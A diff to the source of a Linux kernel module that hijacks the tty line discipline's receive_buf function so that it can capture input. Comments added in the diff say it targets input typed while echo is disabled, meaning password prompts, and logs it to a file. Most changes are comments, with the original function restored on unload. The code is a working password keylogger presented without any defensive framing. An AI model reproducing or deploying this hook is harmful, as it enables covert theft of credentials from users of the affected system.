@@ -17,8 +17,13 @@ struct file* logfile;
 // pointer to the old receive_buf function
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
+
+// our replacement receive_buf
 void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 		     char* fp, int count){
+  // we check if echoing is disabled. If it is,
+  // then it is probably a password prompt and we
+  // want to log it
   if(L_ICANON(tty) && !L_ECHO(tty)){
     // if we have a single character
     if(count == 1){
@@ -51,7 +56,6 @@ static int init(void) {
     if(tty){
       printk(KERN_ALERT "this is a valid tty\n");
       if(tty->ldisc->ops->receive_buf){
-	//printk(KERN_ALERT "has receive_buf\n");
 	//change the old receive_buf
 	old_receive_buf = tty->ldisc->ops->receive_buf;
 	tty->ldisc->ops->receive_buf = new_receive_buf;
@@ -78,9 +82,7 @@ static void exit(void) {
     if(priv) tty=priv->tty;
     if(tty){
       if(tty->ldisc->ops->receive_buf){
-	//printk(KERN_ALERT "has receive_buf\n");
-	//change the old receive_buf
-	//old_receive_buf = tty->ldisc->ops->receive_buf;
+	//restore the receive_buf function
 	tty->ldisc->ops->receive_buf = old_receive_buf;
       }
     }
